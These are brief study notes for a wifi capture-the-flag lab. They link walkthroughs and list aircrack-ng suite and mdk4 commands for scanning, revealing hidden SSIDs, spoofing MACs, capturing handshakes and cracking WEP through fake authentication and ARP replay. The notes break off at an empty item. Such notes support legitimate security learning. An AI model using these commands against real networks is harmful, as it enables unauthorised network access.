# Files: 
https://wifichallengelab.com/challenges  

# Solve:
https://r4ulcl.com/posts/walkthrough-wifichallenge-lab-2.0/#05-what-is-the-flag-in-the-hidden-ap-router-behind-default-credentials  
https://r4ulcl.com/posts/wifi_db-in-wifichallenge-lab/  

# Something new:
1) **airodump-ng** --> sudo airmon-ng start wlan0.  
                       sudo airodump-ng wlan0mon -w ~/wifi/scan --band abg --wps --manufacturer
2) **ESSID of hidden AP** --> https://xre0us.io/posts/identifying-ap-with-hidden-ssid/  
        sudo airmon-ng start wlan0  
        iwconfig wlan0mon channel <channel_number>  
        sudo mdk4 wlan0mon p -t <MAC> -f <wordlist>
3) **Connection using specific ESSID** --> Create config file  
       wpa_supplicant -Dnl80211 -iwlan2 -c <config_file>
       dhclient wlan2 -v  
4) To get valid credentials for login as well as the login.php you have to change the MAC address to that of the client using the ESSID.  
5) **besside-ng** --> used to crack WEP passwords and capture WPA handshakes.  
           besside-ng -c <channel_number> -b <bssid> wlan2 -v  
6) **Cracking WEP passwords** --> Capture data using airodump-ng.  
           To generate extra data to the AP,we can launch a fake authentification using --> sudo aireplay-ng -1 3600 -q  10 -a <BSSID> wlan0mon.  
           Also extra ARP packets can be generated using(ARP request-replay attack) --> sudo aireplay-ng --arpreplay -b <BSSIS> -h <client_MAC> wlan0mon.  
           Use aircrack-ng to crack pwd.  
7) 
